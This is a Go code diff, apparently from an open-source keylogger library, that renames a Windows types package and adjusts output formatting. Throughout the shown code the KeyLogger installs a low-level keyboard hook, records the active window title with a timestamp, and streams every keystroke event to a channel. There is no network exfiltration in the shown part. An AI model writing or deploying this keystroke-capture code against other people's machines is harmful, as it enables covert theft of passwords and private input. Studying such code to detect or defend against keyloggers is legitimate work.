@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"time"
 
+	"github.com/Spriithy/gkl/types"
 	"github.com/Spriithy/gkl/user32"
-	"github.com/Spriithy/gkl/wintypes"
 )
 
 type KeyLogger struct {
@@ -22,24 +22,24 @@ func NewKeylogger(output chan string) *KeyLogger {
 }
 
 func (kl *KeyLogger) Start() {
-	user32.SetWindowsHookExW(wintypes.WH_KEYBOARD_LL, kl.hook, wintypes.NULL, 0)
-	var msg wintypes.MSG
+	user32.SetWindowsHookExW(types.WH_KEYBOARD_LL, kl.hook, types.NULL, 0)
+	var msg types.MSG
 	for user32.GetMessageW(&msg, 0, 0, 0) != 0 {
 	}
 }
 
-func (kl *KeyLogger) hook(nCode int, wParam wintypes.WPARAM, lParam wintypes.LPARAM) wintypes.LRESULT {
+func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) types.LRESULT {
 	hWnd := user32.GetForegroundWindow()
 	threadId := user32.GetWindowThreadProcessId(hWnd, 0)
 	layout := user32.GetKeyboardLayout(threadId)
 
 	var bytes [256]byte
-	user32.GetWindowTextA(hWnd, wintypes.LPCSTR(&bytes[0]), 256)
+	user32.GetWindowTextA(hWnd, types.LPCSTR(&bytes[0]), 256)
 	windowName := string(bytes[:])
 
 	if windowName != kl.previousWindowName {
 		kl.previousWindowName = windowName
-		fmt.Printf("%s - %s\n", time.Now().Local().String(), windowName)
+		fmt.Printf("\n%s - %s\n", time.Now().Local().String(), windowName)
 	}
 
 	kl.input <- NewKeyboardEvent(wParam, lParam, layout)
